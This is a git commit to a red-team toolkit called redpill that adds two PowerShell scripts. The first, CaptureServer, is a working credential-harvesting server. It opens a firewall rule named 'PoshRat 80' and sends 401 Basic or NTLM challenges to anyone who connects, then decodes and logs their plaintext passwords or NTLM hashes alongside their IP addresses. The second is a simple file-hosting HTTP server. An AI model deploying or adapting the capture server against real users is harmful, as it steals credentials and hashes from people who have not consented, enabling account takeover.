4bca31d16c6f17165360179d8ba356b3b8860e22
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2022-05-20 03:15:19 +0100

    redpill v1.2.6 - RedTeam database library

---
+++ lib/HTTP-Server/CaptureServer.ps1
@@ -0,0 +1,168 @@
+﻿function CaptureServer
+{
+
+<#
+
+admin privs required
+Import-Module -Name C:\Users\pedro\Coding\redpill\CaptureServer.ps1 -Force
+CaptureServer -AuthType Basic -IPAddress 192.168.1.72 -LogFilePath $env:tmp\log.txt
+
+
+#>
+
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        [ValidateSet("NTLM2","Basic")]
+        $AuthType = "Basic",
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Port = 80,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
+        $LogFilePath = "$pwd\requestlog.txt"
+
+    )
+
+function ExtractHash([string] $NTLMType3)
+{
+
+	$bytes = [System.Convert]::FromBase64String($NTLMType3)
+	$bytes | foreach { $string = $string + $_.ToString("X2") }
+	
+	Write-Output $string.substring($string.length - 48, 48)
+	
+}
+
+
+[byte[]]$NTLMType2 = 
+	@(0x4e,0x54,0x4c,0x4d, 
+	0x53,0x53,0x50,0x00,
+	0x02,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00,
+	0x00,0x28,0x00,0x00,
+	0x01,0x82,0x00,0x00,
+	0x11,0x22,0x33,0x44,
+	0x55,0x66,0x77,0x88,
+	0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00)
+
+
+    $PPID = $PID
+    echo "$PPID"|Out-File -FilePath "$Env:TMP\mypid.log" -Encoding ascii -Force
+
+    $listener = New-Object System.Net.HttpListener
+    $URL = "http://"+$IPAddress+":"+$Port+"/"
+    $listener.Prefixes.Add($URL) 
+
+    netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
+    netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+
+    $listener.Start()
+    Write-Output "Listening on $URL..."
+    while ($true) {
+        $context = $listener.GetContext() # blocks until request is received
+        $request = $context.Request
+        $response = $context.Response
+	    $hostip = $request.RemoteEndPoint
+	
+	    $headers = $request.Headers
+	    $message = ''
+
+        if ($AuthType -eq "Basic")
+        {
+        $basic = $true
+        }
+
+	    foreach ($key in $headers.AllKeys)
+	    {
+		    if($key -match 'Authorization')
+		    {
+			    [string[]]$values = $headers.GetValues('Authorization')
+			    #Write-Host $values[0] -fore Cyan
+
+			    if ($basic)
+                {
+                    $NTLMAuthentication = $values[0] -split "\s+"
+                    $creds = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $NTLMAuthentication[1])))
+                    Write-Host "`ncaptured credentials" -ForegroundColor Green
+                    Write-Output "--------------------"
+                    Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
+                    Write-Output $creds
+                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
+                    Out-File -FilePath $LogFilePath -InputObject $creds -Append
+                }
+                else
+                {
+                    $NTLMAuthentication = $values[0] -split "\s+"
+			        Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
+                    #Write-Output $NTLMAuthentication[1]
+			        $NTLMType = $NTLMAuthentication[1]
+			        $hash = ExtractHash($NTLMType)
+                    Write-Output $hash
+                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
+                    Out-File -FilePath $LogFilePath -InputObject $hash -Append
+                    Out-File -FilePath $LogFilePath -InputObject ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($NTLMType))) -Append
+                    $ntlmt2 = $true
+                }
+		    }
+		
+		
+        }		
+	
+	    if($ntlmt2)
+	    {
+		    $NTLMType2Response = 'NTLM ' + [Convert]::ToBase64String($NTLMType2)
+		    $response.AddHeader('WWW-Authenticate', $NTLMType2Response)
+		    $response.AddHeader("Content-Type","text/html")
+		    $response.StatusCode = 401
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+        }
+
+        elseif($basic)
+        {
+            $response.AddHeader('WWW-Authenticate', 'Basic')
+		    $response.AddHeader("Content-Type","text/html")
+            $response.AddHeader("Host","InternetGateway")
+		    $response.StatusCode = 401
+        
+
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes("Win Proxy")
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+        }
+
+	    else
+	    {
+		    $response.AddHeader('WWW-Authenticate', 'NTLM')
+		    $response.AddHeader('Content-Type','text/html')
+		    $response.StatusCode = 401
+		
+
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+	    }
+		
+    }
+
+    $listener.Stop()
+    Stop-Process -Id $PPID -Force
+}
---
+++ lib/HTTP-Server/Start-SimpleHTTPServer.ps1
@@ -0,0 +1,217 @@
+﻿<#
+.SYNOPSIS
+   Use this cmdlet to host files for download. The idea of this is to have a
+   PowerShell SimpleHTTPServer that is similar to Python's SimpleHTTPServer module.
+
+.DESCRIPTION
+   Running this function will open a PowerShell web server hosting files in the current
+   directory. The server can be accessed at http://localhost:8000 You can download files.
+   The directories are not able to be traversed through the web server.
+
+.NOTES
+   Author: Robert H. Osborne
+   Contact: rosborne@osbornepro.com
+   Requires Administrator privileges to run
+
+.PARAMETER Port
+   The port parameter is for easily defining what port the http server should listen on. The default value is 8000.
+
+.EXAMPLE
+   Start-SimpleHTTPServer
+   This example starts an HTTP server on port 8000 in the current directory.
+
+.EXAMPLE
+   Start-SimpleHTTPServer -Port 80
+   This example starts an HTTP server on port 80 in the current directory.
+
+.LINK
+   https://osbornepro.com
+   https://writeups.osbornepro.com
+   https://btpssecpack.osbornepro.com
+   https://github.com/tobor88
+   https://gitlab.com/tobor88
+   https://www.powershellgallery.com/profiles/tobor
+   https://www.linkedin.com/in/roberthosborne/
+   https://www.credly.com/users/roberthosborne/badges
+   https://www.hackthebox.eu/profile/52286
+
+.INPUTS
+   Int32
+
+.OUTPUTS
+   None
+#>
+
+Function Start-SimpleHTTPServer {
+    [CmdletBinding()]
+        param(
+            [Parameter(
+                Mandatory=$False,
+                Position=0,
+                ValueFromPipeline=$False,
+                HelpMessage='Enter a port for the HTTP Server to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
+            [ValidateRange(1,65535)]
+            [int32]$Port = 8000)  # End param
+
+    $Address = "http://localhost:$Port/"
+
+    $WebServer = [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
+    $WebServer
+
+    $Listener = New-Object -TypeName System.Net.HttpListener
+    $Listener.Prefixes.Add("$Address")
+    $Listener.Start()
+
+    New-PSDrive -Name 'SimpleHTTPServer' -Root $Pwd.Path -PSProvider FileSystem -Scope Global
+
+    $Root = $Pwd.Path
+
+    Set-Location -Path 'SimpleHTTPServer:\'
+
+    Do {
+
+        $Context = $Listener.GetContext()
+        $RequestUrl = $Context.Request.Url
+        $Response = $Context.Response
+        $Context.User.Identity.Impersonate()
+
+        Write-Host $RequestUrl
+        [array]$Content = @()
+
+        $LocalPath = $RequestUrl.LocalPath
+
+        Try
+        {
+
+            $RequestedItem = Get-Item -Path "SimpleHTTPServer:\$LocalPath" -Force -ErrorAction Stop
+
+            $FullPath = $RequestedItem.FullName
+
+            If($RequestedItem.Attributes -Match "Directory")
+            {
+
+                Function Get-DirectoryContent {
+                    [CmdletBinding(SupportsShouldProcess = $True)]
+                        param (
+                            [Parameter(
+                                Mandatory = $True,
+                                HelpMessage = 'Directory Path')]
+                            [string]$Path,
+
+                            [Parameter(
+                                Mandatory = $False,
+                                HelpMessage = 'Header Name')]
+                            [string]$HeaderName,
+
+                            [Parameter(
+                                Mandatory = $False,
+                                HelpMessage = 'Request URL')]
+                            [string]$RequestURL,
+
+                            [Parameter(
+                                Mandatory = $False,
+                                HelpMessage = 'Subfolder Name')]
+                            [string]$SubfolderName,
+
+                            [string]$Root
+                        )  # End param
+@"
+                <html>
+                <head>
+                <title>$($HeaderName)</title>
+                </head>
+                <body>
+                <h1>$($HeaderName) - $($SubfolderName)</h1>
+                <hr>
+                "@
+                @"
+                <a href="./../">[To Parent Directory]</a><br><br>
+                <table cellpadding="5">
+"@
+                $Files = (Get-ChildItem -Path "$Path")
+                Foreach ($File in $Files)
+                {
+                    $FileURL = ($File.FullName -Replace [regex]::Escape($Root), "" ) -Replace "\\","/"
+                    If (!$File.Length)
+                    {
+                        $FileLength = "[dir]"
+                    }  # End If
+                    Else
+                    {
+                        $FileLength = $File.Length
+                    }  # End Else
+@"
+                <tr>
+                <td align="right">$($File.LastWriteTime)</td>
+                <td align="right">$($FileLength)</td>
+                <td align="left"><a href="$($FileURL)">$($File.Name)</a></td>
+                </tr>
+"@
+                } # End ForEach
+@"
+                </table>
+                <hr>
+                </body>
+                </html>
+"@
+                }  # End Function Get-DirectoryContent
+
+                $Content = Get-DirectoryContent -Path $FullPath -HeaderName "PowerShell Simple HTTP Server" -RequestURL "$Address" -SubfolderName $LocalPath -Root $Root
+
+                $Encoding = [System.Text.Encoding]::UTF8
+                $Content = $Encoding.GetBytes($Content)
+                $Response.ContentType = "text/html"
+
+            }  # End If
+            Else
+            {
+
+                $Content = [System.IO.File]::ReadAllBytes($FullPath)
+
+                $Response.ContentType = [System.Web.MimeMapping]::GetMimeMapping($FullPath)
+
+            }  # End Else
+
+        } # End Try
+        Catch [System.UnauthorizedAccessException]
+        {
+
+            Write-Host "Access Denied" -ForegroundColor 'Red'
+            Write-Host "Current user:  $env:USERNAME" -ForegroundColor 'Red'
+            Write-Host "Requested File: SimpleHTTPServer:\$LocalPath" -ForegroundColor 'Cyan'
+            $Response.StatusCode = 404
+            $Content = [System.Text.Encoding]::UTF8.GetBytes("<h1>404 - Page Not Found</h1>")
+
+        }  # End Catch
+        Catch [System.Management.Automation.ItemNotFoundException]
+        {
+
+            Write-Host "Could not reach. Verify server is accessible over the network:  `n`tSimpleHTTPServer:\$LocalPath" -ForegroundColor 'Red' -BackgroundColor 'Yellow'
+            $Response.StatusCode = 404
+            $Content = [System.Text.Encoding]::UTF8.GetBytes("<h1>404 - Page Not Found</h1>")
+
+        }  # End Catch
+        Catch
+        {
+
+            $Error[0]
+            $Content =  "$($_.InvocationInfo.MyCommand.Name) : $($_.Exception.Message)"
+            $Content +=  "$($_.InvocationInfo.PositionMessage)"
+            $Content +=  "    + $($_.CategoryInfo.GetMessage())"
+            $Content +=  "    + $($_.FullyQualifiedErrorId)"
+
+            $Content = [System.Text.Encoding]::UTF8.GetBytes($Content)
+            $Response.StatusCode = 500
+
+        }  # End Catch
+
+        $Response.ContentLength64 = $Content.Length
+        $Response.OutputStream.Write($Content, 0, $Content.Length)
+        $Response.Close()
+
+        $ResponseStatus = $Response.StatusCode
+        Write-Host $ResponseStatus -ForegroundColor 'Cyan'
+
+    } While ($Listener.IsListening)
+
+}  # End Function Start-SimpleHTTPServer
